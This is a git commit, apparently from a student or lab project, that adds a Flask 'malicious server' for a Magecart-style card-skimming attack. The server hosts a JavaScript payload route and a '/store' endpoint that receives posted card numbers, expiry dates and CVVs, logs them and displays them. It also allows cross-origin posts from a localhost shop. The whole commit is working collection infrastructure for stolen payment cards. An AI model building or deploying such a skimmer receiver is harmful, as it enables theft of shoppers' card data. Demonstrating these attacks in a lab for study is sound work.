3399ceeae7a20cef15ac3020507b2b67b4044510
elphabetsoop <s10257905@connect.np.edu.sg>
2025-01-12 14:57:39 +0800

    feat: add malicious server and working payload logic (yet to use xss)

---
+++ magecart-server/malicious-server.py
@@ -0,0 +1,36 @@
+from flask import Flask, render_template, url_for, request, redirect
+from flask_cors import CORS
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'nospecialword'
+app.jinja_env.globals.update(min=min)
+CORS(app, origins=[
+  'http://localhost:5000',
+])
+
+cards = [
+    {
+        'number': '4111111111111111',
+        'expiry': '12/25',
+        'cvv': '123'
+    }
+    ]
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/payload')
+def payload():
+    return redirect(url_for('static', filename='payload.js'))
+
+@app.route('/store', methods=['GET', 'POST'])
+def store():
+    if request.method == 'POST':
+        card = request.get_json()
+        print("DEBUG::::: ", card)
+        cards.append(card)
+    return render_template('store.html', cards=cards)
+
+if __name__ == '__main__':
+    app.run(debug=True, port=8888)
